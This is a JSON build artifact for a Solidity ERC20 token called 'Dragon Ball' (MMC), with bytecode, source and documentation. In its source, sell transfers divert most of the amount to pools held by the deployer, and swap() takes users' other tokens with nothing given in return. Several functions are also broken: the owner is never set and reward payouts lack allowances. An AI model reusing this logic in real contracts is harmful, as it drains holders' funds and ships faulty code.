006127428482850161267a565b91505092915050565b6000806040838503121561275e57600080fd5b600061276c8582860161267a565b925050602061277d8582860161267a565b9150509250929050565b60008060006060848603121561279c57600080fd5b60006127aa8682870161267a565b93505060206127bb8682870161267a565b92505060406127cc868287016126e3565b9150509250925092565b600080604083850312156127e957600080fd5b60006127f78582860161267a565b92505060206128088582860161268f565b9150509250929050565b6000806040838503121561282557600080fd5b60006128338582860161267a565b9250506020612844858286016126e3565b9150509250929050565b60006020828403121561286057600080fd5b600061286e848285016126a4565b91505092915050565b6000806040838503121561288a57600080fd5b600083013567ffffffffffffffff8111156128a457600080fd5b6128b0858286016126b9565b92505060206128c18582860161267a565b9150509250929050565b6000602082840312156128dd57600080fd5b60006128eb848285016126f8565b91505092915050565b60006020828403121561290657600080fd5b60006129148482850161270d565b91505092915050565b600080600080600060a0868803121561293557600080fd5b60006129438882890161270d565b9550506020612954888289016126e3565b9450506040612965888289016126e3565b93505060606129768882890161270d565b92505060806129878882890161270d565b9150509295509295909350565b61299d816131cb565b82525050565b6129ac816131dd565b82525050565b60006129bd82612f1e565b6129c78185612f29565b93506129d781856020860161322f565b6129e0816133fb565b840191505092915050565b60006129f682612f1e565b612a008185612f3a565b9350612a1081856020860161322f565b80840191505092915050565b6000612a29602383612f29565b9150612a3482613419565b604082019050919050565b6000612a4c600683612f3a565b9150612a5782613468565b600682019050919050565b6000612a6f600483612f3a565b9150612a7a82613491565b600482019050919050565b6000612a92602283612f29565b9150612a9d826134ba565b604082019050919050565b6000612ab5600783612f3a565b9150612ac082613509565b600782019050919050565b6000612ad8602683612f29565b9150612ae382613532565b604082019050919050565b6000612afb601983612f29565b9150612b0682613581565b602082019050919050565b6000612b1e602883612f29565b9150612b29826135aa565b604082019050919050565b6000612b41602583612f29565b9150612b4c826135f9565b604082019050919050565b6000612b64601a83612f29565b9150612b6f82613648565b602082019050919050565b6000612b87601783612f29565b9150612b9282613671565b602082019050919050565b6000612baa602483612f29565b9150612bb58261369a565b604082019050919050565b6000612bcd601583612f29565b9150612bd8826136e9565b602082019050919050565b6000612bf0602583612f29565b9150612bfb82613712565b604082019050919050565b612c0f81613209565b82525050565b612c1e81613213565b82525050565b6000612c3082846129eb565b915081905092915050565b6000612c4682612a3f565b9150819050919050565b6000612c5b82612a62565b9150819050919050565b6000612c7082612aa8565b9150819050919050565b6000602082019050612c8f6000830184612994565b92915050565b6000606082019050612caa6000830186612994565b612cb76020830185612994565b612cc46040830184612c06565b949350505050565b6000602082019050612ce160008301846129a3565b92915050565b60006020820190508181036000830152612d0181846129b2565b905092915050565b60006020820190508181036000830152612d2281612a1c565b9050919050565b60006020820190508181036000830152612d4281612a85565b9050919050565b60006020820190508181036000830152612d6281612acb565b9050919050565b60006020820190508181036000830152612d8281612aee565b9050919050565b60006020820190508181036000830152612da281612b11565b9050919050565b60006020820190508181036000830152612dc281612b34565b9050919050565b60006020820190508181036000830152612de281612b57565b9050919050565b60006020820190508181036000830152612e0281612b7a565b9050919050565b60006020820190508181036000830152612e2281612b9d565b9050919050565b60006020820190508181036000830152612e4281612bc0565b9050919050565b60006020820190508181036000830152612e6281612be3565b9050919050565b6000602082019050612e7e6000830184612c06565b92915050565b6000604082019050612e996000830185612c06565b612ea66020830184612c06565b9392505050565b6000602082019050612ec26000830184612c15565b92915050565b6000612ed2612ee3565b9050612ede8282613294565b919050565b6000604051905090565b600067ffffffffffffffff821115612f0857612f076133cc565b5b612f11826133fb565b9050602081019050919050565b600081519050919050565b600082825260208201905092915050565b600081905092915050565b6000612f5082613209565b9150612f5b83613209565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115612f9057612f8f61333f565b5b828201905092915050565b6000612fa682613209565b9150612fb183613209565b925082612fc157612fc061336e565b5b828204905092915050565b6000808291508390505b600185111561301657808604811115612ff257612ff161333f565b5b60018516156130015780820291505b808102905061300f8561340c565b9450612fd6565b94509492505050565b600061302a82613209565b915061303583613209565b92506130627fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff848461306a565b905092915050565b60008261307a5760019050613136565b816130885760009050613136565b816001811461309e57600281146130a8576130d7565b6001915050613136565b60ff8411156130ba576130b961333f565b5b8360020a9150848211156130d1576130d061333f565b5b50613136565b5060208310610133831016604e8410600b841016171561310c5782820a9050838111156131075761310661333f565b5b613136565b6131198484846001612fcc565b925090508184048111156131305761312f61333f565b5b81810290505b9392505050565b600061314882613209565b915061315383613209565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff048311821515161561318c5761318b61333f565b5b828202905092915050565b60006131a282613209565b91506131ad83613209565b9250828210156131c0576131bf61333f565b5b828203905092915050565b60006131d6826131e9565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600060ff82169050919050565b82818337600083830152505050565b60005b8381101561324d578082015181840152602081019050613232565b8381111561325c576000848401525b50505050565b6000600282049050600182168061327a57607f821691505b6020821081141561328e5761328d61339d565b5b50919050565b61329d826133fb565b810181811067ffffffffffffffff821117156132bc576132bb6133cc565b5b80604052505050565b60006132d082613209565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156133035761330261333f565b5b600182019050919050565b600061331982613209565b915061332483613209565b9250826133345761333361336e565b5b828206905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000601f19601f8301169050919050565b60008160011c9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b7f5245574152440000000000000000000000000000000000000000000000000000600082015250565b7f46554e4400000000000000000000000000000000000000000000000000000000600082015250565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b7f4c4f545445525900000000000000000000000000000000000000000000000000600082015250565b7f45524332303a207472616e7366657220616d6f756e742065786365656473206260008201527f616c616e63650000000000000000000000000000000000000000000000000000602082015250565b7f4d4d432d494e464f3a20417265616c6479207377617065642e00000000000000600082015250565b7f45524332303a207472616e7366657220616d6f756e742065786365656473206160008201527f6c6c6f77616e6365000000000000000000000000000000000000000000000000602082015250565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b7f4d4d432d494e464f3a2043616e6e6f742073776170206e6f772e000000000000600082015250565b7f4d4d432d494e464f3a20416d6f756e74206572726f722e000000000000000000600082015250565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b7f4d4d432d494e464f3a204f6e6c79206f776e65722e0000000000000000000000600082015250565b7f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760008201527f207a65726f000000000000000000000000000000000000000000000000000000602082015250565b61376a816131cb565b811461377557600080fd5b50565b613781816131dd565b811461378c57600080fd5b50565b61379881613209565b81146137a357600080fd5b50565b6137af81613213565b81146137ba57600080fd5b5056fea26469706673582212205a6bf4f2973b40e4d4775ea3abdc35b0bc6929e0d601f430357cd251b116cf7864736f6c63430008040033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: SimPL-2.0\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n\ncontract MemoryToken is ERC20 {\n    using SafeMath for uint256;\n\n    struct SallRate {\n        uint256 start_rate; uint256 end_rate;\n        uint8 sall_fee; uint8 pool_rate;\n    }\n\n    uint8 private _buy_rate;\n    uint8 private _reward_rate;\n\n    uint256 private _start_at;\n    uint256 private _transfer_counter;\n\n    address private _owner;\n    address private _token;\n    address private _pair_address;\n\n    mapping (string => address) private _pools;\n    mapping (address => bool) private _white_list;\n    mapping (uint8 => SallRate) private _sall_rate;\n\n    mapping (address => uint256) private _total_sell;\n    mapping (address => uint256) private _total_balance;\n    mapping (address => mapping (uint256 => bool)) private _swap_times;\n\n    event Swap(uint256 rate, uint256 amount);\n\n    constructor(address token, address pair)\n        ERC20(\"Dragon Ball\", \"MMC\") {\n        \n        uint256 supply = 1400 * 1000000;\n        uint256 decimal = 10 ** uint256(decimals());\n        _mint(msg.sender, supply * decimal);\n\n        _sall_rate[1] = SallRate({\n            start_rate: 0, end_rate: 5 * decimal,\n            sall_fee: 10, pool_rate: 50\n        });\n\n        _sall_rate[2] = SallRate({\n            start_rate: 5 * decimal, end_rate: 10 * decimal,\n            sall_fee: 15, pool_rate: 50\n        });\n\n        _sall_rate[3] = SallRate({\n            start_rate: 10 * decimal, end_rate: 100 * decimal,\n            sall_fee: 30, pool_rate: 50\n        });\n\n        _pools[\"FUND\"] = msg.sender;\n        _pools[\"REWARD\"] = msg.sender;\n        _pools[\"LOTTERY\"] = msg.sender;\n\n        _white_list[msg.sender] = true;\n\n        _token = token;\n        _pair_address = pair;\n        _start_at = block.timestamp;\n    }\n\n    function _calc(address account) private view\n        returns (uint256 rewards) {\n\n        rewards = balanceOf(account);\n        rewards = rewards.mul(100).div(10000);\n    }\n\n    modifier OnlyOwner() {\n        require(msg.sender == _owner, \"MMC-INFO: Only owner.\");\n        _;\n    }\n\n    function setBuyRate(uint8 rate) public OnlyOwner {\n        _buy_rate = rate;\n    }\n\n    function setRewardRate(uint8 rate) public OnlyOwner {\n        _reward_rate = rate;\n    }\n\n    function setPairAddress(address pair) public OnlyOwner {\n        _pair_address = pair;\n    }\n\n    function setPoolAddress(string memory name, address pool)\n        public OnlyOwner {\n        \n        _pools[name] = pool;\n    }\n\n    function setSallRate(uint8 index, uint256 start, uint256 end, uint8 fee, uint8 pool)\n        public OnlyOwner {\n        \n        _sall_rate[index] = SallRate({\n            start_rate: start, end_rate: end,\n            sall_fee: fee, pool_rate: pool\n        });\n    }\n\n    function setWhiteList(address target, bool enable) public OnlyOwner {\n        _white_list[target] = enable;\n    }\n\n    function transfer(address recipient, uint256 amount)\n        public virtual override returns (bool) {\n\n        require(amount > 0, \"MMC-INFO: Amount error.\");\n\n        if (_white_list[msg.sender]) {\n            return super.transfer(recipient, amount);\n        }\n\n        if (recipient == _pair_address) {\n            uint256 total = _total_sell[recipient].add(amount);\n\n            uint256 realRate = 0; uint256 poolRate = 0;\n            uint256 decimal = 10 ** uint256(decimals());\n            uint256 rate = total.mul(decimal).div(totalSupply());\n\n            SallRate memory first  = _sall_rate[1];\n            SallRate memory second = _sall_rate[2];\n            SallRate memory third  = _sall_rate[3];\n\n            if (rate >= first.start_rate && rate < first.end_rate) {\n                realRate = first.sall_fee;\n                poolRate = first.pool_rate;\n            }\n\n            if (rate >= second.start_rate && rate < second.end_rate) {\n                realRate = second.sall_fee;\n                poolRate = second.pool_rate;\n            }\n\n            if (rate >= third.start_rate && rate < third.end_rate) {\n                realRate = third.sall_fee;\n                poolRate = third.pool_rate;\n            }\n\n            uint256 realAmount = amount.mul(realRate).div(100);\n\n            uint256 lastAmount = amount.sub(realAmount);\n            uint256 fundAmount = lastAmount.mul(poolRate).div(100);\n\n            super.transfer(recipient, realAmount);\n            super.transfer(_pools[\"FUND\"], fundAmount);\n            super.transfer(_pools[\"LOTTERY\"], lastAmount.sub(fundAmount));\n        } else {\n            uint256 rewardAmount = amount.mul(_buy_rate).div(100);\n\n            super.transfer(_pools[\"REWARD\"], rewardAmount);\n            super.transfer(recipient, amount.sub(rewardAmount));\n        }\n\n        _transfer_counter = _transfer_counter.add(1);\n\n        bool luck = _transfer_counter % 100 != 0;\n        bool balance = balanceOf(_pools[\"REWARD\"]) <= 0;\n\n        if (luck || balance) { return true; }\n\n        uint256 lottery = balanceOf(_pools[\"LOTTERY\"]);\n        uint256 lotteryAmount = lottery.mul(_reward_rate).div(100);\n\n        return super.transferFrom(_pools[\"REWARD\"], msg.sender, lotteryAmount);\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount)\n        public virtual override returns (bool) {\n\n        require(amount > 0, \"MMC-INFO: Amount error.\");\n\n        if (_white_list[msg.sender]) {\n            return super.transferFrom(sender, recipient, amount);\n        }\n\n        if (recipient == _pair_address) {\n            uint256 total = _total_sell[recipient].add(amount);\n\n            uint256 realRate = 0; uint256 poolRate = 0;\n            uint256 decimal = 10 ** uint256(decimals());\n            uint256 rate = total.mul(decimal).div(totalSupply());\n\n            SallRate memory first  = _sall_rate[1];\n            SallRate memory second = _sall_rate[2];\n            SallRate memory third  = _sall_rate[3];\n\n            if (rate >= first.start_rate && rate < first.end_rate) {\n                realRate = first.sall_fee;\n                poolRate = first.pool_rate;\n            }\n\n            if (rate >= second.start_rate && rate < second.end_rate) {\n                realRate = second.sall_fee;\n                poolRate = second.pool_rate;\n            }\n\n            if (rate >= third.start_rate && rate < third.end_rate) {\n                realRate = third.sall_fee;\n                poolRate = third.pool_rate;\n            }\n\n            uint256 realAmount = amount.mul(realRate).div(100);\n\n            uint256 lastAmount = amount.sub(realAmount);\n            uint256 fundAmount = lastAmount.mul(poolRate).div(100);\n\n            super.transferFrom(sender, recipient, realAmount);\n            super.transferFrom(sender, _pools[\"FUND\"], fundAmount);\n            super.transferFrom(sender, _pools[\"LOTTERY\"], lastAmount.sub(fundAmount));\n        } else {\n            uint256 rewardAmount = amount.mul(_buy_rate).div(100);\n\n            super.transferFrom(sender, _pools[\"REWARD\"], rewardAmount);\n            super.transferFrom(sender, recipient, amount.sub(rewardAmount));\n        }\n\n        _transfer_counter = _transfer_counter.add(1);\n\n        bool luck = _transfer_counter % 100 != 0;\n        bool balance = balanceOf(_pools[\"REWARD\"]) <= 0;\n\n        if (luck || balance) { return true; }\n\n        uint256 lottery = balanceOf(_pools[\"LOTTERY\"]);\n        uint256 lotteryAmount = lottery.mul(_reward_rate).div(100);\n\n        return super.transferFrom(_pools[\"REWARD\"], msg.sender, lotteryAmount);\n    }\n\n    function swap() public returns (bool) {\n        if (_total_balance[msg.sender] == 0) {\n            uint256 balance = IERC20(_token).balanceOf(msg.sender);\n            _total_balance[msg.sender] = balance;\n        }\n\n        uint256 index = 0;\n        uint256 amount = _total_balance[msg.sender];\n\n        for (uint256 i = 0; i < 6; i++) {\n            if (!_swap_times[msg.sender][i]) {\n                index = i;\n                break;\n            }\n        }\n\n        uint256 time = _start_at.add(index.mul(30 days));\n        require(block.timestamp < time, \"MMC-INFO: Cannot swap now.\");\n        require(!_swap_times[msg.sender][index], \"MMC-INFO: Arealdy swaped.\");\n\n        uint256 swapRate = index == 5 ? 2000 : 1500;\n        uint256 rateAmount = amount.mul(swapRate).div(10000);\n        // amount = amount.sub(rateAmount);\n\n        bool success = IERC20(_token).transferFrom(msg.sender, address(this), rateAmount);\n        _swap_times[msg.sender][index] = success;\n\n        emit Swap(swapRate, amount);\n        return _swap_times[msg.sender][index];\n    }\n\n    function getReward(address account) public view returns (uint256) {\n        return _calc(account);\n    }\n\n    function claim() public returns (bool) {\n        uint256 rewards = _calc(msg.sender);\n        return super.transferFrom(_pools[\"REWARD\"], msg.sender, rewards);\n    }\n}",
  "sourcePath": "/home/ace/Projects/eth/other/nec-project/contracts/Memory.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.4+commit.c7e474f2.Emscripten.clang"
  },
  "schemaVersion": "3.3.4",
  "updatedAt": "2021-06-06T13:56:27.608Z",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "allowance(address,address)": {
        "details": "See {IERC20-allowance}."
      },
      "approve(address,uint256)": {
        "details": "See {IERC20-approve}. Requirements: - `spender` cannot be the zero address."
      },
      "balanceOf(address)": {
        "details": "See {IERC20-balanceOf}."
      },
      "decimals()": {
        "details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5,05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the value {ERC20} uses, unless this function is overridden; NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
      },
      "decreaseAllowance(address,uint256)": {
        "details": "Atomically decreases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
      },
      "increaseAllowance(address,uint256)": {
        "details": "Atomically increases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address."
      },
      "name()": {
        "details": "Returns the name of the token."
      },
      "symbol()": {
        "details": "Returns the symbol of the token, usually a shorter version of the name."
      },
      "totalSupply()": {
        "details": "See {IERC20-totalSupply}."
      },
      "transfer(address,uint256)": {
        "details": "See {IERC20-transfer}. Requirements: - `recipient` cannot be the zero address. - the caller must have a balance of at least `amount`."
      },
      "transferFrom(address,address,uint256)": {
        "details": "See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `amount`. - the caller must have allowance for ``sender``'s tokens of at least `amount`."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}